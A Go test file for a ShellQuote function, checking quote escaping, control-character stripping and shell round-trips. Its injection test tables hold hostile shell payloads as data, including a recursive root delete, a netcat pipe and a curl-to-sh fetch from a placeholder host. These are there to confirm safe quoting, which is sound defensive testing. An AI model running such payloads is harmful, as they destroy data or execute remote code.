package util

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"testing"
)

// TestShellQuote_Basic wraps a plain string in single quotes.
func TestShellQuote_Basic(t *testing.T) {
	got := ShellQuote("hello")
	want := "'hello'"
	if got != want {
		t.Errorf("ShellQuote(hello) = %q, want %q", got, want)
	}
}

func TestShellQuote_Empty(t *testing.T) {
	got := ShellQuote("")
	want := "''"
	if got != want {
		t.Errorf("ShellQuote(\"\") = %q, want %q", got, want)
	}
}

// TestShellQuote_HandlesSingleQuote verifies that an embedded single quote
// is escaped using the standard `'\''` trick. The output, when passed to
// /bin/sh -c, must yield the original string byte-for-byte.
func TestShellQuote_HandlesSingleQuote(t *testing.T) {
	input := "it's a test"
	got := ShellQuote(input)

	// The classic safe form for embedded single quotes: close the single-
	// quoted string, insert a literal single quote, reopen the single-
	// quoted string. Implemented in ShellQuote as "'\"'\"'".
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("expected quoted output wrapped in single quotes, got %q", got)
	}
	if !strings.Contains(got, `'"'"'`) {
		t.Errorf("expected the embedded single quote to be escaped, got %q", got)
	}

	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		verifyRoundTrip(t, input, got)
	}
}

// TestShellQuote_StripsControlCharacters ensures that control characters
// (especially newlines) cannot break out of the single-quoted argument.
func TestShellQuote_StripsControlCharacters(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"newline", "line1\nline2"},
		{"carriage-return", "line1\rline2"},
		{"tab", "line1\tline2"},
		{"bell", "line1\x07line2"},
		{"null-byte", "line1\x00line2"},
		{"multiple-controls", "a\nb\rc\td"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ShellQuote(tc.input)
			// No literal control characters should remain inside the quoted form.
			for _, r := range got {
				if r == '\n' || r == '\r' || r == '\x00' || r == '\x07' {
					t.Errorf("ShellQuote(%q) retained control char %q in %q", tc.input, r, got)
				}
			}
		})
	}
}

// TestShellQuote_PreservesSpaces makes sure that spaces inside a single-quoted
// argument are not split into multiple shell words.
func TestShellQuote_PreservesSpaces(t *testing.T) {
	input := "argument with spaces"
	got := ShellQuote(input)
	if got != "'argument with spaces'" {
		t.Errorf("ShellQuote() = %q, want single-quoted with spaces preserved", got)
	}
}

// TestShellQuote_HandlesShellMetacharacters verifies that metacharacters
// like $ ` " \ are treated as literal data and not interpreted by the shell.
func TestShellQuote_HandlesShellMetacharacters(t *testing.T) {
	cases := []string{
		"$VAR",
		"`uname`",
		"\"quoted\"",
		"a;b",
		"a|b",
		"a&b",
		"a>b",
		"a<b",
		"$(rm -rf /)",
		"&& echo pwned",
		"| nc evil 1234",
	}

	for _, input := range cases {
		t.Run(input, func(t *testing.T) {
			got := ShellQuote(input)
			verifyRoundTrip(t, input, got)
		})
	}
}

// TestShellQuote_InjectionAttempts covers classic shell injection payloads.
func TestShellQuote_InjectionAttempts(t *testing.T) {
	cases := []string{
		`'; rm -rf / #`,
		`"$(curl evil.com/sh|sh)"`,
		"`touch /tmp/pwn`",
		"a';echo b;'c",
		"' OR 1=1 --",
	}

	for _, input := range cases {
		t.Run(input, func(t *testing.T) {
			got := ShellQuote(input)
			verifyRoundTrip(t, input, got)
		})
	}
}

// TestShellQuote_LongInput makes sure the function handles long inputs
// without truncation or panic.
func TestShellQuote_LongInput(t *testing.T) {
	input := strings.Repeat("a", 4096) + "'" + strings.Repeat("b", 4096)
	got := ShellQuote(input)
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("expected long input to be wrapped in single quotes, got %q", got)
	}
	if !strings.Contains(got, `'"'"'`) {
		t.Error("expected embedded single quote in long input to be escaped")
	}
}

// TestShellQuote_Unicode ensures unicode characters pass through unchanged.
func TestShellQuote_Unicode(t *testing.T) {
	input := "你好,世界"
	got := ShellQuote(input)
	if got != "'你好,世界'" {
		t.Errorf("ShellQuote(unicode) = %q, want %q", got, "'你好,世界'")
	}
}

// verifyRoundTrip uses /bin/sh -c "printf %s <quoted>" to confirm that
// the quoted form, when evaluated by a real shell, yields the original string.
// Skipped on platforms without /bin/sh.
func verifyRoundTrip(t *testing.T, input, quoted string) {
	t.Helper()
	if _, err := exec.LookPath("/bin/sh"); err != nil {
		t.Skip("/bin/sh not available; skipping round-trip check")
	}
	cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("printf %%s %s", quoted))
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("shell could not evaluate %q: %v (output: %q)", quoted, err, string(out))
	}
	if string(out) != input {
		t.Errorf("round-trip mismatch: input %q -> quoted %q -> shell %q", input, quoted, string(out))
	}
}
